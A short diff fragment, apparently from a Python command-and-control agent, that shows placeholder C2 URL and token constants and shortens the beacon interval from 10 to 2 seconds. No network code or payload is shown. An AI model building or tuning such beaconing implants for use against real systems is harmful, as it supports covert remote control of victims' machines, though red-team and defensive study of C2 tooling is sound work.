@@ -16,7 +16,7 @@ except ImportError:
 
 C2_URL = "__C2_URL__"
 C2_TOKEN = "__C2_TOKEN__"
-BEACON_INTERVAL = 10
+BEACON_INTERVAL = 2
 AGENT_ID_FILE = ".agent_id"
 
 
